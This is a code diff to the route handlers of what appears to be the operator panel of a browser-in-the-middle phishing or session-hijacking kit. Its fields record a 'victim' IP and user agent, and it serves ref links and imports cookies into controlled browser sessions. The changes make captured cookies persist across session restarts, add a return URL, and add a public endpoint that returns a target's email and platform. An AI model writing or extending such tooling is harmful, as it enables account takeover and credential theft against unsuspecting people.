@@ -113,7 +113,7 @@ export default async function panelRoutes(app) {
 
   app.post('/api/accounts', async (req, reply) => {
     if (checkAuth(req, reply) === false) return;
-    const { id, label, startUrl, proxyUrl } = req.body || {};
+    const { id, label, startUrl, proxyUrl, returnUrl } = req.body || {};
     if (!id || !label || !startUrl)
       return reply.code(400).send({ error: 'id, label and startUrl are required' });
     if (!/^[a-z0-9_-]+$/.test(id))
@@ -138,8 +138,8 @@ export default async function panelRoutes(app) {
       const isGoogle = /(^|\.)google\.com$/.test(new URL(startUrl).hostname);
       if (isGoogle) proxyFields = { useProxy: false };
     }
-    await saveAccount({ id, label, startUrl, ...proxyFields });
-    await browser.start(id, req.ip).catch(() => {});
+    await saveAccount({ id, label, startUrl, ...(returnUrl ? { returnUrl } : {}), ...proxyFields });
+    browser.start(id, req.ip).catch(() => {}); // fire-and-forget — don't block the response
     const saved = await getAccount(id);
     const ref = saved?.ref || '';
     const publicHost = config.publicHost || (req.headers['x-forwarded-host'] || req.headers.host || 'localhost');
@@ -164,7 +164,7 @@ export default async function panelRoutes(app) {
     if (!await getAccount(id)) return reply.code(404).send({ error: 'unknown_account' });
     await browser.stop(id).catch(() => {});
     const wiped = await browser.wipeProfile(id);
-    await browser.start(id, req.ip).catch(() => {});
+    browser.start(id, req.ip).catch(() => {}); // fire-and-forget
     return { ok: true, wiped };
   });
 
@@ -221,14 +221,18 @@ export default async function panelRoutes(app) {
     if (checkAuth(req, reply) === false) return;
     const acc = await getAccount(req.params.id);
     if (!acc) return reply.code(404).send({ error: 'unknown_account' });
-    const ctx = browser.getContext(req.params.id);
-    if (!ctx) return reply.code(409).send({ error: 'session_not_running' });
     const cookies = req.body;
     if (!Array.isArray(cookies)) return reply.code(400).send({ error: 'expected a JSON array of cookies' });
-    await ctx.addCookies(cookies);
-    const page = browser.getPage(req.params.id);
-    if (page) await page.goto(acc.startUrl, { waitUntil: 'commit' }).catch(() => {});
-    return { ok: true, count: cookies.length };
+    // Persist so they are re-injected on every future session start.
+    await saveAccount({ ...acc, cookies });
+    // Also inject into the running session immediately if it exists.
+    const ctx = browser.getContext(req.params.id);
+    if (ctx) {
+      await ctx.addCookies(cookies);
+      const page = browser.getPage(req.params.id);
+      if (page) await page.goto(acc.startUrl, { waitUntil: 'commit' }).catch(() => {});
+    }
+    return { ok: true, count: cookies.length, persisted: true };
   });
 
   const withTimeout = (promise, ms = 5000) =>
@@ -321,8 +325,23 @@ export default async function panelRoutes(app) {
     if (!acc.victimIp || !acc.victimUa) {
       await saveAccount({ ...acc, victimIp, victimUa, victimFirstSeen: Date.now() });
     }
-    await browser.start(acc.id, req.ip);
+    // Wait up to 45 s for the browser session to come up before returning,
+    // so the client's first WebSocket attempt lands on a running session.
+    await Promise.race([
+      browser.start(acc.id, req.ip),
+      new Promise((r) => setTimeout(r, 45000)),
+    ]).catch(() => {});
     return { accountId: acc.id, ref: req.params.ref };
+  });
+
+  app.get('/api/account-by-ref/:ref/info', async (req, reply) => {
+    const acc = await getAccountByRef(req.params.ref);
+    if (!acc) return reply.code(404).send({ error: 'unknown_ref' });
+    return {
+      label: acc.label || '',
+      email: acc.email || '',
+      platform: acc.platform || '',
+    };
   });
 
   app.get('/api/accounts/:id/mail-stats', async (req, reply) => {
